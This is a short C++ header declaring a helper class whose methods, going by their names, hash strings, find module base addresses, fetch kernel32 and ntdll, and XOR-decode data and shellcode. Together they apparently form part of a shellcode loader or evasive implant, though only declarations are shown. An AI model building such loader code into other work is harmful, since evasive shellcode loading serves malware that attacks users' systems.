#pragma once
#include "def.h"

#include <string>

class helper {

public:
    unsigned long simpleHash(const std::string& input);
    PVOID GetModuleBase(const wchar_t* moduleName);
    void xor_decode(char* data, int len, char key);

    void xor_shellcode(unsigned char* data, int len, unsigned char shellcode_key);



    unsigned char* getKernel32();
    

    unsigned char* getNtdll();
};

extern helper helperHandler;